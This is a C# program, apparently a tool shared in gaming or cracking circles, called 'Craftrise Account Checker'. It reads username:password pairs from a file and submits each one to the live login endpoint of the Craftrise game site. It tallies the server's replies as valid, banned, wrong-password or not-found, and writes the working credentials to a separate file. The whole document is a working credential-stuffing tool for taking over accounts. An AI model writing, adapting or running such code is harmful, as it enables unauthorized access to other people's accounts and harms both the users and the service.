using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace CraftriseAccountChecker
{
    class Program
    {
        static string LoginAPI = "https://www.craftrise.com.tr/posts/post-login.php";
        static int banned = 0;
        static int wrongpassword = 0;
        static int success = 0;
        static int notfound = 0;
        static string path = "";
        static string checkedpath = "";

        static void Main(string[] args)
        {
            Console.Title = "Craftrise Account Checker | by Cryfix#1337";
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine(@"

  /$$$$$$  /$$$$$$$         /$$$$$$  /$$                           /$$                          
 /$$__  $$| $$__  $$       /$$__  $$| $$                          | $$                          
| $$  \__/| $$  \ $$      | $$  \__/| $$$$$$$   /$$$$$$   /$$$$$$$| $$   /$$  /$$$$$$   /$$$$$$ 
| $$      | $$$$$$$/      | $$      | $$__  $$ /$$__  $$ /$$_____/| $$  /$$/ /$$__  $$ /$$__  $$
| $$      | $$__  $$      | $$      | $$  \ $$| $$$$$$$$| $$      | $$$$$$/ | $$$$$$$$| $$  \__/
| $$    $$| $$  \ $$      | $$    $$| $$  | $$| $$_____/| $$      | $$_  $$ | $$_____/| $$      
|  $$$$$$/| $$  | $$      |  $$$$$$/| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$|  $$$$$$$| $$      by Wortex
 \______/ |__/  |__/       \______/ |__/  |__/ \_______/ \_______/|__/  \__/ \_______/|__/      
                                                                                                
                                                                                                
");
            Console.Write("Account path : ");
            path = Console.ReadLine();
            Console.Write("Checked path : ");
            checkedpath = Console.ReadLine();
            Task.Run((Login));
            Console.Read();
        }

        public static async Task Login()
        {

            foreach(string accounts in File.ReadAllLines(path))
            {
                string[] parameters = accounts.Split(':');
                #region thanks to weizu
                HttpClient client = new HttpClient();
                var formContent = new FormUrlEncodedContent(new[]
                {
            new KeyValuePair<string, string>("value", parameters[0]),
            new KeyValuePair<string, string>("password", parameters[1])
            });
                var pst = await client.PostAsync(LoginAPI, formContent);
                var stringContent = await pst.Content.ReadAsStringAsync();
                #endregion
                if (stringContent == "{\"resultType\":\"error\",\"resultMessage\":\"Bu hesap engellenmiş, giriş yapamazsınız.\"}")
                {
                    banned++;
                    Update();
                }
                else if (stringContent == "{\"resultType\":\"error\",\"resultMessage\":\"Şifre yanlış.\"}")
                {
                    wrongpassword++;
                    Update();
                }
                else if (stringContent == "{\"resultType\":\"success\",\"resultMessage\":\"Giriş başarılı, yönlendiriliyorsunuz.\"}")
                {
                    success++;
                    Update();
                    File.AppendAllText(checkedpath, Environment.NewLine + "Success: " + parameters[0] + ":" + parameters[1]);
                }
                else if (stringContent == "{\"resultType\":\"error\",\"resultMessage\":\"Böyle bir kullanıcı bulunamadı.\"}")
                {
                    notfound++;
                    Update();
                }
            }
        }

        public static void Update()
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine(@"

  /$$$$$$  /$$$$$$$         /$$$$$$  /$$                           /$$                          
 /$$__  $$| $$__  $$       /$$__  $$| $$                          | $$                          
| $$  \__/| $$  \ $$      | $$  \__/| $$$$$$$   /$$$$$$   /$$$$$$$| $$   /$$  /$$$$$$   /$$$$$$ 
| $$      | $$$$$$$/      | $$      | $$__  $$ /$$__  $$ /$$_____/| $$  /$$/ /$$__  $$ /$$__  $$
| $$      | $$__  $$      | $$      | $$  \ $$| $$$$$$$$| $$      | $$$$$$/ | $$$$$$$$| $$  \__/
| $$    $$| $$  \ $$      | $$    $$| $$  | $$| $$_____/| $$      | $$_  $$ | $$_____/| $$      
|  $$$$$$/| $$  | $$      |  $$$$$$/| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$|  $$$$$$$| $$      by Wortex
 \______/ |__/  |__/       \______/ |__/  |__/ \_______/ \_______/|__/  \__/ \_______/|__/      
                                                                                                
                                                                                                
");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"True Accounts: {success}");
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine($"Banned Account: {banned}");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"Wrong Password: {wrongpassword}");
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine($"User Not Found: {notfound}");
        }
    }
}
